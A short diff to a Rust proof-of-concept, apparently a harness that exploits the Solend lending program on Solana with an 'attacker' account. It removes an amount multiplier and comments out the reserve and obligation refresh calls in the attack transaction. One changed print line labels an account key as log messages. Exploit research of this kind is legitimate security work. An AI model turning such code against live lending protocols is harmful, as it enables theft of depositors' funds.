@@ -150,8 +150,8 @@ pub fn demo002() {
             / 1_000_000.0
     );
     println!("Using {} BTC", input as f64 / 1_000_000.0);
-    let input = input *10;
-    let collateral_amount = collateral_amount *10;
+    let input = input;
+    let collateral_amount = collateral_amount;
 
 // deposit and withdraw btc
     env.execute_as_transaction(
@@ -168,18 +168,18 @@ pub fn demo002() {
                 lending_market_key,
                 attacker.pubkey(),
             ),
-            // refresh again
-            solend_token_lending::instruction::refresh_reserve(
-                solend_program_key,
-                reserve_key,
-                reserve.liquidity.pyth_oracle_pubkey,
-                reserve.liquidity.switchboard_oracle_pubkey,
-            ),
-            solend_token_lending::instruction::refresh_obligation(
-                solend_program_key,
-                obligation.pubkey(),
-                vec![],
-            ),
+            // // refresh again
+            // solend_token_lending::instruction::refresh_reserve(
+            //     solend_program_key,
+            //     reserve_key,
+            //     reserve.liquidity.pyth_oracle_pubkey,
+            //     reserve.liquidity.switchboard_oracle_pubkey,
+            // ),
+            // solend_token_lending::instruction::refresh_obligation(
+            //     solend_program_key,
+            //     obligation.pubkey(),
+            //     vec![],
+            // ),
             // withdraw
             // solend_token_lending::instruction::redeem_reserve_collateral(
             //     solend_program_key,
@@ -210,8 +210,5 @@ pub fn demo002() {
             .amount as f64
             / 1_000_000.0
     );
-    println!(
-        "collateral Amount after: {} BTC",
-        env.get_account(collateral_ata).unwrap().lamports
-    );
+    println!("transaction_log_messages: {:#?} ", collateral_ata);
 }
